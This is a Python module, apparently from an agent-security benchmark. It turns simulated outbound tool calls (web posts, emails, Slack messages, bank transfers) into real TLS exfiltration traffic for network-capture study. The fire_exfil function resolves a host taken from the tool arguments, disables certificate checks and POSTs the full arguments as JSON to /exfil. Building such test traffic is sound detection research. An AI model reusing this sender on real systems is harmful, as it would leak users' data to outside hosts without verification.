"""真实外泄出口（从 split_tool_backend 抽取，无 native_* 依赖，stdlib-only）。

官方引擎的外部外发工具（post_webpage / send_email / send_direct_message /
send_channel_message / send_money / schedule_transaction）在内存执行成功后，
打开一条真实 TLS 连接到同网 receiver(443)，ClientHello SNI = 目标域名，形成
真实的 ``DNS query -> DNS response -> TCP -> TLS(SNI)`` 外泄链，供 N 模态在网卡
pcap 上观测（SNI / 握手 / 流量量级），不导出 payload 明文。

best-effort：传输失败不改变工具可见返回或官方 oracle。每次外发只在内存记录
阶段/结果，不保存参数正文；运行入口在传感器停止后统一写审计文件。
DNS 失败即中止（绝不 IP 直连）。发送完成不代表 receiver 已完整收件。
"""
import json
import re
import socket
import ssl
import time
from pathlib import Path

RECEIVER_PORT = 443
_AUDIT_RECORDS: list[dict] = []


def write_exfil_audit(path: Path) -> None:
    """Called only after capture stops; audit-only, never a model input."""
    with Path(path).open('x', encoding='utf-8') as stream:
        stream.write(''.join(json.dumps(row, ensure_ascii=False) + '\n'
                             for row in _AUDIT_RECORDS))
    _AUDIT_RECORDS.clear()

# 参数里不携带 hostname 的外部工具的规范目标域名
CANONICAL_HOSTS = {
    "send_direct_message": "slack.com",
    "send_channel_message": "slack.com",
    "send_money": "banking.transfer",
    "schedule_transaction": "banking.transfer",
}


def exfil_target_host(tool_name: str, args: dict) -> str | None:
    """从工具调用参数推导外泄目标域名（即 ClientHello SNI）。"""
    if tool_name == "post_webpage":
        url = str((args or {}).get("url", "") or "")
        url = re.sub(r"^[a-zA-Z][a-zA-Z0-9+.-]*://", "", url)  # 去掉 scheme
        host = url.split("/")[0].split(":")[0].strip()
        return host or "www.example.com"
    if tool_name == "send_email":
        recipients = (args or {}).get("recipients") or []
        addr = str(recipients[0]) if recipients else ""
        if "@" in addr:
            return addr.rsplit("@", 1)[-1] or "mail.local"
        return addr or "mail.local"
    return CANONICAL_HOSTS.get(tool_name)


def fire_exfil(tool_name: str, args: dict | None, call_id: str | None = None) -> None:
    """对外发工具发起一次真实 HTTPS 外泄（DNS→TCP→TLS），best-effort。"""
    target_host = exfil_target_host(tool_name, args)
    if not target_host:
        return
    record = {'sequence': len(_AUDIT_RECORDS) + 1, 'timestamp': time.time(),
              'tool': tool_name, 'target': target_host, 'stage': 'dns',
              'connected': False, 'tls_established': False, 'send_completed': False,
              'success': False, 'error_type': None}
    sock = None
    try:
        infos = socket.getaddrinfo(target_host, RECEIVER_PORT, socket.AF_INET, socket.SOCK_STREAM)
        resolved_ip = infos[0][4][0]
        record['stage'] = 'prepare'
        body = json.dumps(
            {"tool": tool_name, "target": target_host, "arguments": args or {}, "call_id": call_id},
            ensure_ascii=False,
        ).encode("utf-8")
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        record['stage'] = 'connect'
        sock = socket.create_connection((resolved_ip, RECEIVER_PORT), timeout=3)
        record['connected'] = True
        sock.settimeout(3)
        record['stage'] = 'tls'
        with context.wrap_socket(sock, server_hostname=target_host) as tls:
            record['tls_established'] = True
            record['stage'] = 'send'
            req = (
                "POST /exfil HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\n"
                "Content-Length: {}\r\nConnection: close\r\n\r\n"
            ).format(target_host, len(body)).encode("ascii") + body
            tls.sendall(req)
            record['send_completed'] = True
            record['stage'] = 'response'
            response_bytes = 0
            while chunk := tls.recv(65536):
                response_bytes += len(chunk)
            # Transport observation only, NOT a delivery or harm oracle.
            if response_bytes:
                record.update(stage='complete', success=True)
            else:
                record['error_type'] = 'EmptyResponse'
    except (OSError, ValueError, TypeError) as exc:
        record['error_type'] = type(exc).__name__  # no exception text / arguments
    finally:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        _AUDIT_RECORDS.append(record)
